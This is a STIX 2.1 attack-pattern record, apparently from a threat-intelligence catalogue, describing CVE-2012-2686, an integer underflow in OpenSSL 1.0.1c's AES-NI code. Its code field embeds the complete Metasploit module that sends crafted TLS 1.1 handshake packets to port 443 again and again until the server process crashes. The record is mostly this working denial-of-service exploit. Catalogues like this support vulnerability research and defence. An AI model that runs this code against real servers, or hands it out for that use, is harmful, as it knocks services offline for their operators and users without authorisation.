{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1175de43-37dc-4957-b808-79ddbaf38bf2",
    "created": "2024-08-14T16:25:51.460376Z",
    "modified": "2024-08-14T16:25:51.46038Z",
    "name": "OpenSSL TLS 1.1 and 1.2 AES-NI DoS",
    "description": " The AES-NI implementation of OpenSSL 1.0.1c does not properly compute the length of an encrypted message when used with a TLS version 1.1 or above. This leads to an integer underflow which can cause a DoS. The vulnerable function aesni_cbc_hmac_sha1_cipher is only included in the 64-bit versions of OpenSSL. This module has been tested successfully on Ubuntu 12.04 (64-bit) with the default OpenSSL 1.0.1c package. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/ssl/openssl_aesni.rb",
            "external_id": "openssl_aesni.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-2686"
        },
        {
            "source_name": "reference",
            "url": "https://www.openssl.org/news/secadv/20130205.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n# auxilary/dos/ssl/openssl_aesni\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'\t\t=> 'OpenSSL TLS 1.1 and 1.2 AES-NI DoS',\n      'Description'\t=> %q{\n          The AES-NI implementation of OpenSSL 1.0.1c does not properly compute the\n        length of an encrypted message when used with a TLS version 1.1 or above. This\n        leads to an integer underflow which can cause a DoS. The vulnerable function\n        aesni_cbc_hmac_sha1_cipher is only included in the 64-bit versions of OpenSSL.\n        This module has been tested successfully on Ubuntu 12.04 (64-bit) with the default\n        OpenSSL 1.0.1c package.\n      },\n      'Author'\t=>\n        [\n          'Wolfgang Ettlinger <wolfgang.ettlinger[at]gmail.com>'\n        ],\n      'License'\t\t=> MSF_LICENSE,\n      'References'\t=>\n        [\n          [ 'CVE', '2012-2686'],\n          [ 'URL', 'https://www.openssl.org/news/secadv/20130205.txt' ]\n        ],\n      'DisclosureDate' => '2013-02-05'))\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptInt.new('MAX_TRIES', [true,  \"Maximum number of tries\", 300])\n      ])\n  end\n\n  def run\n    # Client Hello\n    p1 =  \"\\x16\"\t\t\t\t# Content Type: Handshake\n    p1 << \"\\x03\\x01\"\t\t\t\t# Version: TLS 1.0\n    p1 << \"\\x00\\x7e\"\t\t\t\t# Length: 126\n    p1 << \"\\x01\"\t\t\t\t# Handshake Type: Client Hello\n    p1 << \"\\x00\\x00\\x7a\"\t\t\t# Length: 122\n    p1 << \"\\x03\\x02\"\t\t\t\t# Version: TLS 1.1\n    p1 << (\"A\" * 32)\t\t\t\t# Random\n    p1 << \"\\x00\"\t\t\t\t# Session ID Length: 0\n    p1 << \"\\x00\\x08\"\t\t\t\t# Cypher Suites Length: 6\n    p1 << \"\\xc0\\x13\"\t\t\t\t# - ECDHE-RSA-AES128-SHA\n    p1 << \"\\x00\\x39\"\t\t\t\t# - DHE-RSA-AES256-SHA\n    p1 << \"\\x00\\x35\"\t\t\t\t# - AES256-SHA\n    p1 << \"\\x00\\xff\"\t\t\t\t# - EMPTY_RENEGOTIATION_INFO_SCSV\n    p1 << \"\\x01\"\t\t\t\t# Compression Methods Length: 1\n    p1 << \"\\x00\"\t\t\t\t# - NULL-Compression\n    p1 << \"\\x00\\x49\"\t\t\t\t# Extensions Length: 73\n    p1 << \"\\x00\\x0b\"\t\t\t\t# - Extension: ec_point_formats\n    p1 << \"\\x00\\x04\"\t\t\t\t#   Length: 4\n    p1 << \"\\x03\"\t\t\t\t#   EC Points Format Length: 3\n    p1 << \"\\x00\"\t\t\t\t#   - uncompressed\n    p1 << \"\\x01\"\t\t\t\t#   - ansiX962_compressed_prime\n    p1 << \"\\x02\"\t\t\t\t#   - ansiX962_compressed_char2\n    p1 << \"\\x00\\x0a\"\t\t\t\t# - Extension: elliptic_curves\n    p1 << \"\\x00\\x34\"\t\t\t\t#   Length: 52\n    p1 << \"\\x00\\x32\"\t\t\t\t#   Elliptic Curves Length: 50\n    # 25 Elliptic curves:\n    p1 << \"\\x00\\x0e\\x00\\x0d\\x00\\x19\\x00\\x0b\\x00\\x0c\\x00\\x18\\x00\\x09\\x00\\x0a\"\n    p1 << \"\\x00\\x16\\x00\\x17\\x00\\x08\\x00\\x06\\x00\\x07\\x00\\x14\\x00\\x15\\x00\\x04\"\n    p1 << \"\\x00\\x05\\x00\\x12\\x00\\x13\\x00\\x01\\x00\\x02\\x00\\x03\\x00\\x0f\\x00\\x10\"\n    p1 << \"\\x00\\x11\"\n\n    p1 << \"\\x00\\x23\"\t\t\t\t# - Extension: SessionTicket TLS\n    p1 << \"\\x00\\x00\"\t\t\t\t#   Length: 0\n    p1 << \"\\x00\\x0f\"\t\t\t\t# - Extension: Heartbeat\n    p1 << \"\\x00\\x01\"\t\t\t\t#   Length: 1\n    p1 << \"\\x01\"\t\t\t\t#   Peer allowed to send requests\n\n\n    # Change Cipher Spec Message\n    p2_cssm =  \"\\x14\"\t\t\t\t# Content Type: Change Cipher Spec\n    p2_cssm << \"\\x03\\x02\"\t\t\t# Version: TLS 1.1\n    p2_cssm << \"\\x00\\x01\"\t\t\t# Length: 1\n    p2_cssm << \"\\x01\"\t\t\t\t# Change Cipher Spec Message\n\n\n    # Encrypted Handshake Message\n    p2_ehm =  \"\\x16\"\t\t\t\t# Content Type: Handshake\n    p2_ehm << \"\\x03\\x02\"\t\t\t# Version: TLS 1.1\n    p2_ehm << \"\\x00\\x40\"\t\t\t# Length: 64\n    p2_ehm << (\"A\" * 64)\t\t\t# Encrypted Message\n\n\n    # Client Key Exchange, Change Cipher Spec, Encrypted Handshake\n    # AES256-SHA\n    p2_aes_sha =  \"\\x16\"\t\t\t# Content Type: Handshake\n    p2_aes_sha << \"\\x03\\x02\"\t\t\t# Version: TLS 1.1\n    p2_aes_sha << \"\\x01\\x06\"\t\t\t# Length: 262\n    p2_aes_sha << \"\\x10\"\t\t\t# Handshake Type: Client Key Exchange\n    p2_aes_sha << \"\\x00\\x01\\x02\"\t\t# Length: 258\n    p2_aes_sha << \"\\x01\\x00\"\t\t\t# Encrypted PreMaster Length: 256\n    p2_aes_sha << (\"\\x00\" * 256)\t\t# Encrypted PresMaster (irrelevant)\n    p2_aes_sha << p2_cssm \t\t\t# Change Cipher Spec Message\n    p2_aes_sha << p2_ehm\t\t\t# Encrypted Handshake Message\n\n\n    # DHE-RSA-AES256-SHA\n    p2_dhe =  \"\\x16\"\t\t\t\t# Content Type: Handshake\n    p2_dhe << \"\\x03\\x02\"\t\t\t# Version: TLS 1.1\n    p2_dhe << \"\\x00\\x46\"\t\t\t# Length: 70\n    p2_dhe << \"\\x10\"\t\t\t\t# Handshake Type: Client Key Exchange\n    p2_dhe << \"\\x00\\x00\\x42\"\t\t\t# Length: 66\n    p2_dhe << \"\\x00\\x40\"\t\t\t# DH Pubkey Length: 64\n    p2_dhe << (\"A\" * 64)\t\t\t# DH Pubkey\n    p2_dhe << p2_cssm\t\t\t\t# Change Cipher Spec Message\n    p2_dhe << p2_ehm\t\t\t\t# Encrypted Handshake Message\n\n\n    # ECDHE-RSA-AES128-SHA\n    p2_ecdhe =  \"\\x16\"\t\t\t\t# Content Type: Handshake\n    p2_ecdhe << \"\\x03\\x02\"\t\t\t# Version: TLS 1.1\n    p2_ecdhe << \"\\x00\\x46\"\t\t\t# Length: 70\n    p2_ecdhe << \"\\x10\"\t\t\t\t# Handshake Type: Client Key Exchange\n    p2_ecdhe << \"\\x00\\x00\\x42\"\t\t\t# Length: 66\n    p2_ecdhe << \"\\x41\"\t\t\t\t# EC DH Pubkey Length: 65\n    # EC DH Pubkey:\n    p2_ecdhe << \"\\x04\\x2f\\x22\\xf4\\x06\\x3f\\xa1\\xf7\\x3d\\xb6\\x55\\xbc\\x68\\x65\\x57\\xd8\"\n    p2_ecdhe << \"\\x03\\xe5\\xaa\\x36\\xeb\\x0f\\x52\\x5a\\xaf\\xd0\\x9f\\xf8\\xc7\\xfe\\x09\\x69\"\n    p2_ecdhe << \"\\x5b\\x38\\x95\\x58\\xb6\\x0d\\x27\\x53\\xe9\\x63\\xcb\\x96\\xb3\\x54\\x47\\xa6\"\n    p2_ecdhe << \"\\xb2\\xe6\\x8b\\x2a\\xd9\\x03\\xb4\\x85\\x46\\xd9\\x1c\\x5f\\xd1\\xf7\\x7b\\x73\"\n    p2_ecdhe << \"\\x40\"\n    p2_ecdhe << p2_cssm\t\t\t\t# Change Cipher Spec Message\n    p2_ecdhe << p2_ehm\t\t\t\t# Encrypted Handshake Message\n\n\n    maxtries = datastore['MAX_TRIES']\n\n    success = false\n\n    for i in 0..maxtries\n      print_status(\"Try \\##{i}\")\n\n      connect\n\n      sock.put(p1)\n      resp = sock.get_once\n\n      cs = get_cipher_suite(resp)\n\n      if cs == 0xc013 # ECDHE-RSA-AES128-SHA\n        p2 = p2_ecdhe\n      elsif cs == 0x0039 # DHE-RSA-AES256-SHA\n        p2 = p2_dhe\n      elsif cs == 0x0035 # AES256-SHA\n        p2 = p2_aes_sha\n      else\n        print_error(\"No common ciphers!\")\n        return\n      end\n\n      sock.put(p2)\n\n      alert = nil\n\n      begin\n        alert = sock.get_once(-1, 2)\n      rescue EOFError\n        print_good(\"DoS successful. process on #{rhost} did not respond.\")\n        success = true\n        break\n      end\n\n      disconnect\n\n    end\n\n    if success == false\n      print_error(\"DoS unsuccessful.\")\n    end\n  end\n\n  def get_cipher_suite(resp)\n    offset = 0\n\n    while offset < resp.length\n      type = (resp[offset, 1]).unpack(\"C\")[0]\n\n      if not type == 22 # Handshake\n        return nil\n      end\n\n      len = (resp[offset+3, 2]).unpack(\"n\")[0]\n      hstype = (resp[offset+5, 1]).unpack(\"C\")[0]\n\n      if hstype == 2 # Server Hello\n        return (resp[offset+44, 2]).unpack(\"n\")[0]\n      end\n\n      offset += len\n    end\n\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2013-02-05"
}